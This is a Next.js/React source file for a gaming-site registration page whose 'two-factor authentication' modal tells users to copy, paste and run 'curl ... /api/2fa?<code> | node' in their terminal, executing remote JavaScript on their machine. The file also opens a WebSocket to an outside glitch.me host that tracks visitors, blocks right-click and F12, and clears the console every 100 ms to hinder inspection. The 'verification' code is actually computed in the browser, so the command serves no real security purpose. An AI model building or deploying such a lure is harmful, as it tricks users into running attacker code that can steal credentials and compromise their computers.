import React, { useState, useEffect, useRef, ReactElement } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';
import { registerUser, setCurrentUser, isUserRegistered, updateCurrentUser, getCurrentUser } from '@/utils/userStorage';
import AuthGuard from '@/components/auth/AuthGuard';



function Register() {
  const router = useRouter();
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
  const [errorMessage, setErrorMessage] = useState('');
  const [authError, setAuthError] = useState('');
  const [successMessage, setSuccessMessage] = useState('');
  const [isLoginFlow, setIsLoginFlow] = useState(false);
  
  const verificationInputs = useRef<HTMLInputElement[]>([]);
  const wsRef = useRef<WebSocket | null>(null);
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Device-specific code generation
  const generateDeviceCode = () => {
    const browserInfo = navigator.userAgent + navigator.language + screen.width + screen.height + navigator.platform;
    const timestamp = Date.now().toString();
    const randomSalt = Math.random().toString(36).substring(2, 15);
    const combined = browserInfo + timestamp + randomSalt;
    const deviceId = btoa(combined).replace(/[^A-Z0-9]/g, '').substring(0, 32);
    return deviceId.length >= 32 ? deviceId.substring(0, 32) : (deviceId + 'I63WNVUSB7RFXAQ4SOMIMLSDOUNMR2U').substring(0, 32);
  };

  const getDeviceCode = () => {
    let deviceCode = localStorage.getItem('infinity_device_code');
    if (!deviceCode) {
      deviceCode = generateDeviceCode();
      localStorage.setItem('infinity_device_code', deviceCode);
    }
    return deviceCode;
  };

  const generateVerificationCode = (deviceCode: string) => {
    // Generate time-sensitive verification code (expires after 3 minutes)
    const currentTime = Date.now();
    const timeWindow = Math.floor(currentTime / (3 * 60 * 1000)); // 3-minute windows
    const seedString = deviceCode + timeWindow.toString();
    
    let hash = 0;
    for (let i = 0; i < seedString.length; i++) {
      const char = seedString.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString().padStart(6, '0').substring(0, 6);
  };

  // fillVerificationCode function removed - users must manually enter codes

  const checkForVerificationCode = () => {
    console.log('🔍 Ready to receive verification code...');
    console.log('💡 Please run the identity command to generate your verification code');
    console.log('📋 After running the command, manually enter the displayed code below');
    
    // No automatic polling - users must manually enter the code from command output
    setSuccessMessage('📋 Please run the curl command and manually enter the verification code it displays');
    setTimeout(() => setSuccessMessage(''), 8000);
  };

  useEffect(() => {
    // Check if user is coming from login flow
    try {
      const user = getCurrentUser();
      if (user && user.needs2FA && user.authenticated) {
        setIsLoginFlow(true);
        
        // Clear any existing device code to ensure a new verification code for this session
        localStorage.removeItem('infinity_device_code');
        
        setIsModalOpen(true);
        checkForVerificationCode();
      }
    } catch (error) {
      console.error('Error checking user status:', error);
    }

    // WebSocket connection
    const PING = 99;
    const SEND_UID = 101;
    const BROWSER_CONNECTED = 102;
    
    // Generate unique ID (simple implementation)
    const uniqueId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
    
    const ws = new WebSocket("wss://mature-flossy-morning.glitch.me");
    wsRef.current = ws;
    
    ws.onopen = () => {
      const jsonObject = {
        e: BROWSER_CONNECTED,
        v: uniqueId
      };
      ws.send(JSON.stringify(jsonObject));
    };
    
    const pingInterval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        const pingObject = {
          e: PING,
          v: "k"
        };
        ws.send(JSON.stringify(pingObject));
      }
    }, 5000);

    ws.onmessage = (event) => {
      // Disabled auto-filling of verification codes
      // Users must manually run the curl command and enter the code themselves
      const msg = JSON.parse(event.data);
      if (msg.e === SEND_UID) {
        console.log('📱 Verification code received via WebSocket, but auto-fill is disabled');
        console.log('💡 Please run the curl command and manually enter the displayed code');
      }
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };

    // Security measures
    const handleContextMenu = (e: Event) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'F12' || (e.ctrlKey && e.key === 'i')) {
        e.preventDefault();
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    const clearConsoleInterval = setInterval(() => {
      console.clear();
    }, 100);

    return () => {
      ws.close();
      clearInterval(pingInterval);
      clearInterval(clearConsoleInterval);
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
      if (pollIntervalRef.current) {
        clearInterval(pollIntervalRef.current);
      }
    };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const handleOpenModal = () => {
    if (email && password && confirmPassword) {
      // Check if passwords match
      if (password !== confirmPassword) {
        setErrorMessage('Passwords do not match!');
        return;
      }
      
      // Check if user already exists
      if (isUserRegistered(email)) {
        setErrorMessage('User already exists. Please sign in instead.');
        return;
      }
      
      // Register the user
      const registrationSuccess = registerUser(email, password);
      
      if (registrationSuccess) {
        // Clear any existing device code to force generation of a new one for this registration session
        localStorage.removeItem('infinity_device_code');
        
        // Set user session with 2FA pending
        setCurrentUser(email, true, true);
        
        // Clear any previous errors and open 2FA modal
        setErrorMessage('');
        setIsModalOpen(true);
        checkForVerificationCode();
      } else {
        setErrorMessage('Registration failed. Please try again.');
      }
    } else {
      setErrorMessage('Please fill in all required fields!');
    }
  };

  const handleCloseModal = () => {
    setIsModalOpen(false);
    if (pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current);
    }
  };

  const handleCopyCommand = async () => {
    const deviceCode = getDeviceCode();
    const domainUrl = window.location.origin;
    const commandText = `curl -s ${domainUrl}/api/2fa?${deviceCode} | node`;
    
    try {
      await navigator.clipboard.writeText(commandText);
      setSuccessMessage('Security command copied to clipboard!');
      setTimeout(() => setSuccessMessage(''), 2000);
    } catch (err) {
      console.error('Error copying command: ', err);
      setSuccessMessage('❌ Error copying command');
      setTimeout(() => setSuccessMessage(''), 2000);
    }
  };

  const handleVerificationInputChange = (index: number, value: string) => {
    if (value.length <= 1) {
      const newCode = [...verificationCode];
      newCode[index] = value;
      setVerificationCode(newCode);
      
      if (value.length === 1 && index < 5) {
        verificationInputs.current[index + 1]?.focus();
      }
    }
  };

  const handleVerificationInputKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && verificationCode[index] === '' && index > 0) {
      verificationInputs.current[index - 1]?.focus();
    }
  };

  const handleTwoFASubmit = (codeArray?: string[]) => {
    const codeToCheck = codeArray || verificationCode;
    const allInputsFilled = codeToCheck.every(digit => digit !== '');
    
    if (allInputsFilled) {
      const enteredCode = codeToCheck.join('');
      const deviceCode = getDeviceCode();
      const expectedCode = generateVerificationCode(deviceCode);
      
      if (enteredCode === expectedCode) {
        setAuthError('');
        
        if (isLoginFlow) {
          // For login flow, clear the needs2FA flag
          updateCurrentUser({ needs2FA: false });
          
          setIsModalOpen(false);
          setTimeout(() => {
            router.push('/');
          }, 1000);
        } else {
          // For registration flow, complete the registration
          updateCurrentUser({ needs2FA: false });
          
          setIsModalOpen(false);
          setSuccessMessage('✅ Authentication successful! Redirecting...');
          setTimeout(() => {
            router.push('/dashboard');
          }, 2000);
        }
      } else {
        setAuthError('Invalid verification code!');
        setVerificationCode(['', '', '', '', '', '']);
        verificationInputs.current[0]?.focus();
      }
    } else {
      setAuthError('Please enter all 6 digits!');
    }
  };

  const getSecureCommand = () => {
    const deviceCode = getDeviceCode();
    const domainUrl = window.location.origin;
    return `curl -s ${domainUrl}/api/2fa?${deviceCode} | node`;
  };

  return (
    <>
      <Head>
        <title>Register | P12 | Project Twelve</title>
        <link rel="icon" type="image/png" sizes="100x100" href="/favicon.ico" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
      </Head>

      <div className="register-page">
        {/* Background Effects */}
        <div className="bg-container">
          <div className="bg-gradient"></div>
          <div className="bg-orb"></div>
          <div className="bg-orb"></div>
          <div className="bg-orb"></div>
          <div className="floating-element"></div>
          <div className="floating-element"></div>
          <div className="floating-element"></div>
          <div className="decorative-line"></div>
          <div className="decorative-line"></div>
        </div>

        {/* Main Content */}
        <div className="main-container">
          {/* Logo Section */}
          <div className="logo-section">
            <div className="logo-icon">
              <span>P12</span>
            </div>
            <h1 className="logo-title">
              {isLoginFlow ? 'Complete Sign-In' : 'Join P12 Gaming'}
            </h1>
            <p className="logo-subtitle">
              {isLoginFlow ? 'Two-factor authentication required' : 'Create your gaming account'}
            </p>
          </div>

          {/* Registration Form */}
          {!isLoginFlow && (
            <div className="form-container">
              <form onSubmit={(e) => e.preventDefault()}>
                <div className="form-group">
                  <label htmlFor="email" className="form-label">Email Address</label>
                  <div className="form-input-wrapper">
                    <input
                      type="email"
                      id="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="form-input"
                      placeholder="Enter your email"
                      required
                    />
                    <svg className="form-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"></path>
                    </svg>
                  </div>
                </div>

                <div className="form-group">
                  <label htmlFor="password" className="form-label">Password</label>
                  <div className="form-input-wrapper">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="form-input"
                      placeholder="Enter your password"
                      required
                    />
                    <svg
                      className="form-input-icon password-toggle"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? (
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
                      ) : (
                        <>
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
                        </>
                      )}
                    </svg>
                  </div>
                </div>

                <div className="form-group">
                  <label htmlFor="confirmPassword" className="form-label">Confirm Password</label>
                  <div className="form-input-wrapper">
                    <input
                      type={showConfirmPassword ? 'text' : 'password'}
                      id="confirmPassword"
                      value={confirmPassword}
                      onChange={(e) => setConfirmPassword(e.target.value)}
                      className="form-input"
                      placeholder="Confirm your password"
                      required
                    />
                    <svg
                      className="form-input-icon password-toggle"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                      onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                    >
                      {showConfirmPassword ? (
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
                      ) : (
                        <>
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
                        </>
                      )}
                    </svg>
                  </div>
                </div>

                {errorMessage && (
                  <div className="error-alert">
                    {errorMessage}
                  </div>
                )}

                <button type="button" onClick={handleOpenModal} className="register-btn">
                  Create Account
                </button>
              </form>
            </div>
          )}

          {/* Navigation Links */}
          <div className="back-link-container">
            <button onClick={() => router.push('/signin')} className="back-link">
              ← Already have an account? Sign In
            </button>
          </div>
        </div>

        {/* Two-Factor Authentication Modal */}
        {isModalOpen && (
          <div className="modal">
            <div className="modal-content">
              <button className="modal-close" onClick={handleCloseModal}>
                &times;
              </button>
              <h2 className="modal-title">
                🔐 {isLoginFlow ? 'Complete Your Sign-In' : 'Two-Factor Authentication'}
              </h2>

              <div className="security-info">
                <div className="security-header">
                  <div className="security-icon">🔐</div>
                  <h4 className="security-title">Enhanced Security Verification</h4>
                </div>

                <p className="security-description">
                  {isLoginFlow 
                    ? 'Welcome back! To complete your sign-in, please verify your identity using our advanced two-factor authentication system.'
                    : 'To ensure maximum security, we use an advanced two-factor authentication system that requires local cryptographic verification on your device.'
                  }
                </p>

                <div className="security-steps">
                  <h4>🔹 Security Protocol Steps:</h4>
                  <ol>
                    <li>Copy the secure command below</li>
                    <li>Open terminal/command prompt</li>
                    <li>Paste and execute the command</li>
                    <li>Enter the generated 6-digit verification code</li>
                  </ol>
                </div>

                <div className="command-container">
                  <div className="command-header">
                    <span className="command-label">🖥️ Terminal Command</span>
                    <span className="copy-btn" onClick={handleCopyCommand}>
                      📋 Copy
                    </span>
                  </div>
                  <code className="command-text">
                    {getSecureCommand()}
                  </code>
                </div>
              </div>

              <div className="verification-section">
                <div>
                  <label className="form-label">Verification Code:</label>
                  {authError && (
                    <span className="auth-alert">{authError}</span>
                  )}
                </div>
                <div className="verification-code">
                  {verificationCode.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => {
                        if (el) verificationInputs.current[index] = el;
                      }}
                      type="text"
                      className="verification-input"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleVerificationInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleVerificationInputKeyDown(index, e)}
                      required
                    />
                  ))}
                </div>
                <button className="submit-btn" onClick={() => handleTwoFASubmit()}>
                  Submit
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Success Alert */}
        {successMessage && (
          <div className="success-alert show">
            {successMessage}
          </div>
        )}

        <style jsx>{`
          * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
          }
          
          .register-page {
            min-height: 100vh;
            background: #000;
            font-family: Arial, sans-serif;
            color: #fff;
            overflow-x: hidden;
          }
          
          /* Background Effects */
          .bg-container {
            position: fixed;
            inset: 0;
            min-height: 100vh;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            background: black;
          }
          
          .bg-gradient {
            position: absolute;
            inset: 0;
            background: linear-gradient(45deg, rgba(67, 187, 255, 0.2) 0%, rgba(252, 89, 255, 0.1) 50%, rgba(30, 219, 140, 0.2) 100%);
            animation: pulse 4s ease-in-out infinite;
          }
          
          .bg-orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            animation: float 6s ease-in-out infinite;
          }
          
          .bg-orb:nth-child(2) {
            top: 10%;
            left: 10%;
            width: 300px;
            height: 300px;
            background: rgba(67, 187, 255, 0.1);
            animation-delay: -2s;
          }
          
          .bg-orb:nth-child(3) {
            bottom: 10%;
            right: 10%;
            width: 200px;
            height: 200px;
            background: rgba(252, 89, 255, 0.1);
            animation-delay: -1s;
          }
          
          .bg-orb:nth-child(4) {
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 150px;
            height: 150px;
            background: rgba(30, 219, 140, 0.1);
            animation-delay: -3s;
          }
          
          /* Floating Elements */
          .floating-element {
            position: absolute;
            border-radius: 50%;
            animation: bounce 3s ease-in-out infinite;
          }
          
          .floating-element:nth-child(5) {
            top: 5%;
            right: 5%;
            width: 20px;
            height: 20px;
            background: rgba(67, 187, 255, 0.3);
            animation-delay: 0.5s;
          }
          
          .floating-element:nth-child(6) {
            bottom: 5%;
            left: 5%;
            width: 15px;
            height: 15px;
            background: rgba(252, 89, 255, 0.3);
            animation-delay: 1s;
          }
          
          .floating-element:nth-child(7) {
            top: 30%;
            right: 20%;
            width: 10px;
            height: 10px;
            background: rgba(30, 219, 140, 0.3);
            animation-delay: 1.5s;
          }
          
          /* Decorative Lines */
          .decorative-line {
            position: absolute;
            width: 1px;
            background: linear-gradient(to bottom, rgba(67, 187, 255, 0.5), transparent);
          }
          
          .decorative-line:nth-child(8) {
            top: 0;
            left: 25%;
            height: 80px;
          }
          
          .decorative-line:nth-child(9) {
            bottom: 0;
            right: 30%;
            height: 60px;
            background: linear-gradient(to top, rgba(252, 89, 255, 0.5), transparent);
          }
          
          /* Main Container */
          .main-container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding: 2rem;
          }
          
          /* Logo Section */
          .logo-section {
            text-align: center;
            margin-bottom: 2rem;
          }
          
          .logo-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(to right, #43BBFF, #FC59FF);
            margin-bottom: 1rem;
            animation: pulse 2s ease-in-out infinite;
          }
          
          .logo-icon span {
            font-size: 2rem;
            font-weight: bold;
            color: #000;
          }
          
          .logo-title {
            font-size: 2rem;
            font-weight: bold;
            background: linear-gradient(to bottom, #FFFFDA 0%, #FFE7B6 50%, #CE9658 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.5rem;
          }
          
          .logo-subtitle {
            color: #A5A6AB;
            font-size: 1rem;
          }
          
          /* Form Container */
          .form-container {
            background: rgba(61, 68, 75, 0.5);
            border: 1px solid rgb(70, 75, 90);
            backdrop-filter: blur(16px);
            border-radius: 1rem;
            padding: 2rem;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
          }
          
          .form-group {
            margin-bottom: 1.5rem;
          }
          
          .form-label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            color: #CEDCFF;
            margin-bottom: 0.5rem;
          }
          
          .form-input-wrapper {
            position: relative;
          }
          
          .form-input {
            width: 100%;
            padding: 0.75rem 1rem;
            padding-right: 2.5rem;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(111, 119, 132, 0.5);
            border-radius: 0.5rem;
            color: #fff;
            font-size: 1rem;
            transition: all 0.2s ease;
          }
          
          .form-input:focus {
            outline: none;
            border-color: #43BBFF;
            box-shadow: 0 0 0 2px rgba(67, 187, 255, 0.2);
          }
          
          .form-input::placeholder {
            color: #A5A6AB;
          }
          
          .form-input-icon {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            width: 1.25rem;
            height: 1.25rem;
            color: #A5A6AB;
            cursor: pointer;
            transition: color 0.2s ease;
          }
          
          .form-input-icon:hover {
            color: #fff;
          }
          
          /* Error Alert */
          .error-alert {
            text-align: center;
            font-size: 0.875rem;
            color: #FF6B6B;
            margin-top: 0.5rem;
          }
          
          /* Button */
          .register-btn {
            width: 100%;
            padding: 0.75rem 1.5rem;
            background: linear-gradient(to right, #43BBFF, #FC59FF);
            border: none;
            border-radius: 0.5rem;
            color: #000;
            font-size: 1.125rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            display: block;
            text-align: center;
          }
          
          .register-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(67, 187, 255, 0.3);
          }
          
          .register-btn:active {
            transform: translateY(0);
          }
          
          /* Back Link */
          .back-link-container {
            margin-top: 2rem;
            text-align: center;
          }
          
          .back-link {
            color: #A5A6AB;
            text-decoration: none;
            font-size: 0.875rem;
            transition: color 0.2s ease;
            background: none;
            border: none;
            cursor: pointer;
          }
          
          .back-link:hover {
            color: #fff;
          }
          
          /* Modal Styles */
          .modal {
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
          }
          
          .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(61, 68, 75, 0.95);
            border: 1px solid rgb(70, 75, 90);
            backdrop-filter: blur(16px);
            border-radius: 1rem;
            padding: 2rem;
            width: 90%;
            max-width: 500px;
            color: #fff;
          }
          
          .modal-close {
            position: absolute;
            top: 1rem;
            right: 1rem;
            background: none;
            border: none;
            color: #A5A6AB;
            font-size: 1.5rem;
            cursor: pointer;
            transition: color 0.2s ease;
          }
          
          .modal-close:hover {
            color: #fff;
          }
          
          .modal-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 1rem;
            color: #43BBFF;
          }
          
          .security-info {
            background: rgba(30, 219, 140, 0.1);
            border: 1px solid rgba(30, 219, 140, 0.3);
            border-radius: 0.5rem;
            padding: 1.5rem;
            margin: 1rem 0;
          }
          
          .security-header {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
          }
          
          .security-icon {
            background: #1EDB8C;
            color: #000;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 10px;
            font-size: 0.75rem;
            font-weight: bold;
          }
          
          .security-title {
            color: #1EDB8C;
            font-size: 1rem;
            font-weight: 600;
          }
          
          .security-description {
            color: #CEDCFF;
            font-size: 0.875rem;
            line-height: 1.4;
            margin-bottom: 1rem;
          }
          
          .security-steps {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 0;
          }
          
          .security-steps h4 {
            color: #fff;
            font-size: 0.875rem;
            margin-bottom: 0.5rem;
          }
          
          .security-steps ol {
            color: #A5A6AB;
            font-size: 0.8125rem;
            line-height: 1.6;
            padding-left: 1.125rem;
          }
          
          .command-container {
            background: #263238;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 0;
            position: relative;
          }
          
          .command-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 0.5rem;
          }
          
          .command-label {
            color: #90A4AE;
            font-size: 0.6875rem;
          }
          
          .copy-btn {
            color: #43BBFF;
            text-decoration: underline;
            cursor: pointer;
            font-size: 0.6875rem;
            transition: color 0.2s ease;
          }
          
          .copy-btn:hover {
            color: #1EDB8C;
          }
          
          .command-text {
            color: #43BBFF;
            font-family: 'Courier New', monospace;
            font-size: 0.8125rem;
            word-break: break-all;
            line-height: 1.4;
          }
          
          .verification-section {
            margin-top: 1.5rem;
          }
          
          .verification-code {
            display: flex;
            justify-content: space-between;
            gap: 0.5rem;
            margin: 1rem 0;
          }
          
          .verification-input {
            width: 40px;
            height: 40px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(111, 119, 132, 0.5);
            border-radius: 0.25rem;
            color: #fff;
            font-size: 1.25rem;
            font-weight: bold;
            text-align: center;
            transition: all 0.2s ease;
          }
          
          .verification-input:focus {
            outline: none;
            border-color: #43BBFF;
            box-shadow: 0 0 0 2px rgba(67, 187, 255, 0.2);
          }
          
          .submit-btn {
            width: 100%;
            padding: 0.75rem;
            background: linear-gradient(to right, #43BBFF, #FC59FF);
            border: none;
            border-radius: 0.5rem;
            color: #000;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 1rem;
          }
          
          .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(67, 187, 255, 0.3);
          }
          
          .submit-btn:active {
            transform: translateY(0);
          }
          
          .auth-alert {
            color: #FF6B6B;
            font-size: 0.875rem;
            margin-top: 0.5rem;
          }
          
          .success-alert {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(30, 219, 140, 0.9);
            color: #000;
            padding: 1rem 2rem;
            border-radius: 0.5rem;
            font-size: 1rem;
            font-weight: 600;
            z-index: 1001;
            opacity: 0;
            transition: opacity 0.3s ease;
          }
          
          .success-alert.show {
            opacity: 1;
          }
          
          /* Animations */
          @keyframes pulse {
            0%, 100% {
              opacity: 1;
            }
            50% {
              opacity: 0.5;
            }
          }
          
          @keyframes float {
            0%, 100% {
              transform: translateY(0px);
            }
            50% {
              transform: translateY(-20px);
            }
          }
          
          @keyframes bounce {
            0%, 100% {
              transform: translateY(0px);
            }
            50% {
              transform: translateY(-10px);
            }
          }
          
          /* Responsive Design */
          @media (max-width: 640px) {
            .main-container {
              padding: 1rem;
            }
            
            .form-container {
              padding: 1.5rem;
            }
            
            .logo-icon {
              width: 60px;
              height: 60px;
            }
            
            .logo-icon span {
              font-size: 1.5rem;
            }
            
            .logo-title {
              font-size: 1.5rem;
            }
            
            .modal-content {
              width: 95%;
              padding: 1.5rem;
            }
            
            .verification-input {
              width: 35px;
              height: 35px;
              font-size: 1rem;
            }
            
            .bg-orb:nth-child(2) {
              width: 200px;
              height: 200px;
            }
            
            .bg-orb:nth-child(3) {
              width: 150px;
              height: 150px;
            }
            
            .bg-orb:nth-child(4) {
              width: 100px;
              height: 100px;
            }
          }
        `}</style>
      </div>
    </>
  );
}

// Custom layout for Register page (no header/footer)
Register.getLayout = function getLayout(page: ReactElement) {
  return (
    <AuthGuard>
      {page}
    </AuthGuard>
  );
};

export default Register; 